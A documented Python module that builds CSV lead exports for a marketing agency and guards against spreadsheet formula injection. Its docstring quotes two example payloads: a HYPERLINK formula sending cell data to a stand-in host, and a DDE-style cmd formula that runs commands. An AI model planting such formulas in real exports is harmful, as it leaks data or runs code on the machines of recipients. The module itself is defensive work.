"""
leads_csv_exporter — arma el CSV de leads que VaoVao entrega a sus clientes.

Qué genera
----------
Un CSV con columnas fijas al principio y al final, y en medio una columna
por cada llave que aparezca en el `form_data` de los leads exportados:

    leadgen_id, form_id, campaign_name, <...columnas de form_data...>,
    status, assigned_to, notes, received_at

`form_data` es JSON sin esquema (ver `Lead.form_data` en
app/models/__init__.py): cada formulario de Meta trae sus propias llaves, y
dos leads del mismo cliente pueden traer conjuntos distintos. Por eso el
conjunto de columnas se calcula a partir de los leads que se están
exportando —la unión de sus llaves, en orden alfabético para que la salida
sea determinística sin importar en qué orden vengan los leads— y no de una
lista fija en el código. Un lead al que le falta una llave que otro sí tiene
queda con la celda vacía.

La amenaza: inyección de fórmulas (CSV injection)
--------------------------------------------------
Este archivo lo abre un humano en Excel o Google Sheets. El contenido de
`form_data` lo escribió quien sea que llenó el formulario de Meta —es decir,
cualquiera en internet, sin autenticarse—, y ese mismo contenido termina
siendo el texto crudo de una celda. Si una celda empieza con `=`, `+`, `-` o
`@` (o con un tab o un retorno de carro, que igual desalinean la fila), la
hoja de cálculo la interpreta como el inicio de una fórmula, no como texto.
Un `full_name` como `=HYPERLINK("http://evil.tld?d="&A1,"click")` filtra el
contenido de otras celdas al abrirlo; en configuraciones donde Excel permite
llamadas a `cmd`, el estilo `=cmd|'/c calc'!A1` llega a ejecutar comandos en
la máquina de quien abre el archivo. Es la referencia OWASP "CSV Injection".

Mitigación elegida: si el valor de una celda empieza con uno de esos
caracteres, se le antepone una comilla simple (`'`). Es la mitigación
estándar (OWASP la recomienda igual) y la razón de elegirla sobre, por
ejemplo, quitar el caracter o encerrar todo en comillas dobles:

  * Excel y Sheets tratan la comilla simple al inicio de una celda como "lo
    que sigue es texto, no lo evalúes" —es la misma convención que usan para
    que un código postal como "00501" no se convierta en el número 501— y al
    mostrarla NO pintan la comilla: el usuario ve el valor original. Por eso
    un teléfono como `+502 5541 2290` sigue siendo legible: la comilla que
    antepone `_csv_safe` es invisible en la hoja, el cliente ve
    "+502 5541 2290" tal cual.
  * La alternativa de "quitar el caracter peligroso" mutila el dato real
    (un teléfono sin el `+` deja de ser el mismo teléfono); la de "encerrar
    todo en comillas dobles" no alcanza, porque una hoja de cálculo evalúa
    la fórmula ANTES de mirar si el CSV la citó— las comillas dobles son
    sintaxis de CSV, no de la hoja de cálculo.

Aviso honesto: el "no se muestra la comilla" es el comportamiento documentado
de Excel. No todas las hojas de cálculo ni todas las versiones lo garantizan
igual —algunas variantes de Google Sheets sí pueden dejar ver la comilla
literal al importar—. Aun en ese caso peor, el resultado es una comilla de
más al inicio del texto (cosmético, y el usuario entiende que es texto), NO
una fórmula ejecutada: la garantía de seguridad no depende de que la comilla
se oculte, sólo de que la celda deje de empezar con el caracter peligroso.

Qué columnas se sanean
-----------------------
Se aplica la misma función a TODAS las columnas, no sólo a `form_data`:

  * `form_data` — el caso obvio: lo escribe cualquiera en internet.
  * `campaign_name` — también viene de Meta (lo nombra quien administra la
    cuenta publicitaria del cliente), no lo genera este sistema.
  * `leadgen_id`, `form_id` — son ids que asigna Meta, siempre numéricos en
    la práctica; sanear no les hace nada porque nunca empiezan con un
    caracter peligroso, pero dejar la sanitización fuera de la lista sería
    confiar en un supuesto sobre el formato de un id ajeno.
  * `status`, `assigned_to`, `received_at` — los genera este sistema
    (un Enum, un nombre de usuario, una fecha formateada); sanear es un
    no-op real, no una decisión de seguridad.
  * `notes` — lo escribe el staff de VaoVao, no el público. No es la
    amenaza que este módulo existe para cerrar, pero sanearla igual no
    cuesta nada y cierra de paso el caso —menor— de un miembro del equipo
    escribiendo sin querer algo que empieza con "-" (un número negativo a
    mano) o "=" y que otro miembro del equipo abre después.

Aplicarla parejo a las ocho columnas, en vez de decidir columna por columna
cuáles sí y cuáles no, es más fácil de auditar (no hay que confiar en que la
próxima persona que agregue una columna se acuerde de clasificarla) y no
tiene costo: para las columnas que el sistema controla, es un no-op.

Codificación: UTF-8 con BOM
----------------------------
Los datos son en español —"José", "Muñoz", "¿Cuál es tu presupuesto?"—.
Excel en Windows, al abrir un `.csv` con doble clic, asume la codificación
ANSI/Windows-1252 de la máquina si el archivo no trae Byte Order Mark (BOM);
un archivo UTF-8 sin BOM se ve con mojibake ("JosÃ©", "MuÃ±oz"). Excel SÍ
reconoce el BOM de UTF-8 y con él abre el archivo correctamente sin que el
cliente tenga que pasar por el asistente de importación (Datos > Desde
texto/CSV, elegir codificación a mano). Por eso se codifica como
`utf-8-sig`: agrega esos tres bytes (`EF BB BF`) al inicio, invisibles en
cualquier editor o parser que sepa de BOM (incluido el módulo `csv` de
Python al leerlo de vuelta), y hace que Excel abra el archivo tal cual.
`utf-8-sig` es la codificación completa —incluye el BOM—, no `utf-8` a secas.

Exportación vacía
------------------
Cero leads no es un error: es un cliente sin actividad en el período
filtrado, un caso legítimo y probable. Devolver algo que no es un CSV
válido (el plan original devolvía el string `b"No leads to export"`) le
entrega al cliente un archivo roto: Excel no lo abre como hoja de cálculo,
lo abre como una sola celda con ese texto, o directamente se queja del
formato. En vez de eso, `export_leads_csv([])` devuelve un CSV válido con
sólo la fila de encabezados (sin columnas de `form_data`, porque no hay
ningún lead del que sacarlas) — el cliente lo abre y ve una hoja vacía con
las columnas esperadas, que es la señal correcta: "no hubo leads", no
"esto se rompió".

`assigned_to`
-------------
Se muestra el nombre del responsable, no su id. Dos casos que no deben
tronar:

  * Lead sin asignar (`assigned_to_id is None`): se muestra "Sin asignar",
    la misma etiqueta que usa `leads_service.SIN_ASIGNAR` en la bitácora,
    para no inventar una segunda forma de decir lo mismo.
  * El usuario asignado fue borrado: `Lead.assigned_to_id` tiene
    `ondelete="SET NULL"` (ver app/models/__init__.py), así que borrar un
    `User` ya deja el lead como no asignado a nivel de base de datos antes
    de que este módulo lo vea. `_assigned_to_label` igual no asume que
    `lead.assigned_to` esté poblado: si por lo que sea la relación no trae
    nada (o el objeto no tiene `full_name`), cae al mismo "Sin asignar" en
    vez de reventar con `AttributeError`.

`received_at`
--------------
Se guarda en UTC (`DateTime(timezone=True)`, ver el modelo). Un cliente en
Guatemala leyendo un timestamp ISO en UTC con microsegundos
("2026-08-25T14:32:07.481293+00:00") tiene que restarle a mano las 6 horas
de diferencia y no le importan los microsegundos. Se convierte a
`America/Guatemala` (zona fija UTC-6 desde 2006, sin horario de verano —
`zoneinfo` igual resuelve el caso general en vez de restar 6 horas a mano)
y se formatea como `DD/MM/AAAA HH:MM`, el orden de fecha que se usa en
Guatemala y el resto de Centroamérica, sin segundos ni microsegundos: nadie
que lee una bandeja de leads necesita esa precisión.

Por qué la resolución de la zona horaria NO puede tronar al importar
----------------------------------------------------------------------
`zoneinfo.ZoneInfo` no trae los datos de zonas horarias consigo: los lee de
la base de datos IANA del sistema operativo (o del paquete `tzdata` si el
sistema no tiene una). Windows no trae esa base de datos, y las imágenes
Linux "slim" que se usan para desplegar tampoco siempre la traen. Si
`ZoneInfo("America/Guatemala")` se llamara a nivel de módulo sin red de
seguridad y esos datos faltaran, `import
app.services.leads_csv_exporter` fallaría — y como este es un servicio que
Task 8 monta en el router de la API, ese `import` ocurre al arrancar toda la
aplicación: un CSV que no se puede exportar es un problema del endpoint,
pero una API que no arranca es una caída total. Por eso `_resolve_tz_guatemala()`
atrapa el error de resolución y cae a un `timezone(timedelta(hours=-6))` fijo
—exactamente la zona horaria real de Guatemala, que no tiene horario de
verano— dejando un WARNING en el log para que el fallback sea visible y no
un bug silencioso. `tzdata` además se agregó a `requirements.txt` para que,
en producción, ese fallback casi nunca tenga que activarse; se deja de todos
modos porque un `pip install` incompleto o un entorno distinto no deberían
poder tumbar el arranque por esto. NO quitar esta rama pensando que es
código muerto: es la única razón de que el import no sea frágil.
"""
from __future__ import annotations

import csv
import io
import logging
from datetime import datetime, timedelta, timezone
from typing import Any, Iterable
from zoneinfo import ZoneInfo

from app.models import Lead

logger = logging.getLogger(__name__)

# ── Columnas fijas ───────────────────────────────────────────────
_COLUMNS_BEFORE_FORM_DATA = ("leadgen_id", "form_id", "campaign_name")
_COLUMNS_AFTER_FORM_DATA = ("status", "assigned_to", "notes", "received_at")

# Misma etiqueta que `app/services/leads_service.SIN_ASIGNAR`. No se importa
# de allá para no acoplar el exportador a la capa de actualización auditada
# por una sola constante de texto; si el texto cambia en un lugar, cambiarlo
# aquí es una búsqueda trivial.
SIN_ASIGNAR = "Sin asignar"

# Fallback fijo si la base de datos IANA no está disponible (ver el
# docstring del módulo, sección "resolución de zona horaria"). Guatemala es
# UTC-6 todo el año, sin horario de verano, así que este offset fijo es
# correcto siempre — no es una aproximación que se degrade con la fecha.
_GUATEMALA_FIXED_OFFSET = timezone(timedelta(hours=-6), name="America/Guatemala (fijo)")


def _resolve_tz_guatemala() -> "ZoneInfo | timezone":
    """`ZoneInfo("America/Guatemala")`, o el offset fijo si faltan los datos IANA.

    Ver el docstring del módulo: esto existe para que `import
    app.services.leads_csv_exporter` nunca falle por un `tzdata` ausente en
    el sistema (Windows, o una imagen Linux mínima). El fallback es
    correcto igual —Guatemala no cambia de horario— así que el único costo
    real de tomarlo es cosmético, no funcional; por eso se resuelve una sola
    vez al importar y no en cada llamada.
    """
    try:
        return ZoneInfo("America/Guatemala")
    except Exception:
        logger.warning(
            "No se pudo cargar la base de datos de zonas horarias IANA "
            "(falta 'tzdata' o el sistema no la trae); "
            "leads_csv_exporter usa un offset fijo UTC-6 para "
            "'received_at'. Esto es correcto para Guatemala (no tiene "
            "horario de verano), pero revisa que 'tzdata' esté instalado "
            "para no depender de este fallback.",
            exc_info=True,
        )
        return _GUATEMALA_FIXED_OFFSET


_TZ_GUATEMALA = _resolve_tz_guatemala()

# Caracteres que, al inicio de una celda, una hoja de cálculo interpreta
# como el arranque de una fórmula (`=`, `+`, `-`, `@`) o que desalinean la
# fila (tab, retorno de carro). Referencia: OWASP CSV Injection.
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


# ── Saneamiento contra inyección de fórmulas ──────────────────────
def _csv_safe(value: Any) -> str:
    """Convierte `value` a texto y neutraliza un posible inicio de fórmula.

    Ver el docstring del módulo para la razón de elegir el prefijo de
    comilla simple sobre otras mitigaciones, y por qué se aplica a todas
    las columnas y no sólo a `form_data`.
    """
    text = "" if value is None else str(value)
    if text[:1] in _FORMULA_PREFIXES:
        return "'" + text
    return text


# ── Formateo de columnas ──────────────────────────────────────────
def _format_received_at(value: datetime | None) -> str:
    """`received_at` en hora de Guatemala, legible por un humano en una hoja."""
    if value is None:
        return ""
    if value.tzinfo is None:
        # No debería pasar (la columna es `DateTime(timezone=True)`), pero
        # si llegara un datetime naive no se adivina su zona: se asume UTC,
        # que es lo que guarda el modelo, en vez de tronar con
        # `ValueError: astimezone() cannot be applied to a naive datetime`.
        value = value.replace(tzinfo=timezone.utc)
    local = value.astimezone(_TZ_GUATEMALA)
    return local.strftime("%d/%m/%Y %H:%M")


def _assigned_to_label(lead: Lead) -> str:
    """Nombre del responsable, o "Sin asignar". Nunca truena.

    Cubre tanto el lead sin asignar (`assigned_to_id is None`) como el caso
    de un responsable que ya no está: `Lead.assigned_to_id` es
    `ondelete="SET NULL"`, así que un usuario borrado ya deja el lead sin
    asignar a nivel de base de datos. Se usa `getattr` en vez de
    `lead.assigned_to.full_name` directo por si la relación viniera
    poblada con algo que no tiene el atributo esperado.
    """
    user = lead.assigned_to
    if user is None:
        return SIN_ASIGNAR
    name = getattr(user, "full_name", None)
    return name or SIN_ASIGNAR


def _form_data_columns(leads: Iterable[Lead]) -> list[str]:
    """Unión de las llaves de `form_data` de todos los leads, en orden alfabético.

    Orden alfabético y no "orden de aparición" a propósito: el orden de
    aparición depende de en qué orden vinieron los leads (que a su vez
    depende del filtro/paginación de quien llama), y esa no es información
    que el archivo deba cargar. Alfabético es determinístico sin importar
    el orden de entrada, así que exportar el mismo conjunto de leads dos
    veces —aunque vengan en otro orden— da el mismo encabezado.
    """
    keys: set[str] = set()
    for lead in leads:
        keys.update((lead.form_data or {}).keys())
    return sorted(keys)


# ── Exportación ───────────────────────────────────────────────────
def export_leads_csv(leads: list[Lead]) -> bytes:
    """Arma el CSV completo (encabezado + filas) como bytes listos para servir.

    `leads` con cero elementos es un caso válido (ver docstring del módulo):
    el resultado es un CSV con sólo el encabezado fijo, sin columnas de
    `form_data`. No hace falta una rama especial para ese caso: con la lista
    vacía, `_form_data_columns` devuelve `[]` y el `for` de abajo no itera,
    así que el único camino de código sirve para ambos casos.

    Line terminator `\\r\\n` explícito (RFC 4180): es el default de
    `csv.writer`, pero se deja explícito porque es parte del contrato del
    formato, no un detalle interno de la librería.
    """
    form_columns = _form_data_columns(leads)
    header = [*_COLUMNS_BEFORE_FORM_DATA, *form_columns, *_COLUMNS_AFTER_FORM_DATA]

    # `newline=""` en el buffer, igual que recomienda la documentación del
    # módulo `csv`: si no, en Windows cada "\r\n" que escribe `csv.writer`
    # se traduce otra vez y la fila queda separada por "\r\r\n".
    buffer = io.StringIO(newline="")
    writer = csv.writer(buffer, lineterminator="\r\n")
    writer.writerow(_csv_safe(col) for col in header)

    for lead in leads:
        form_data = lead.form_data or {}
        row = [
            lead.leadgen_id,
            lead.form_id,
            lead.campaign_name,
            *[form_data.get(key, "") for key in form_columns],
            lead.status,
            _assigned_to_label(lead),
            lead.notes,
            _format_received_at(lead.received_at),
        ]
        writer.writerow(_csv_safe(cell) for cell in row)

    # utf-8-sig: UTF-8 + BOM, para que Excel en Windows abra el archivo con
    # los acentos correctos sin pasar por el asistente de importación. Ver
    # el docstring del módulo.
    return buffer.getvalue().encode("utf-8-sig")


def build_export_filename(client_name: str | None = None) -> str:
    """Nombre de archivo para la descarga, listo para un header `Content-Disposition`.

    Misma convención que `report_builder.build_pdf`: el nombre del cliente
    convertido a slug (todo lo que no sea alfanumérico se vuelve "-") más
    una fecha en ISO 8601, para que dos descargas del mismo cliente en
    fechas distintas no se pisen y el nombre no traiga espacios ni acentos
    que compliquen el header HTTP. Sin `client_name` (exportación que cruza
    varios clientes, o el caller no lo tiene a mano) el nombre queda como
    "leads-<fecha>.csv", sin repetir la palabra "leads" como si fuera el
    slug de un cliente que no existe.
    """
    today = datetime.now(timezone.utc).date().isoformat()
    slug = "".join(ch if ch.isalnum() else "-" for ch in (client_name or "").lower()).strip("-")
    if not slug:
        return f"leads-{today}.csv"
    return f"leads-{slug}-{today}.csv"
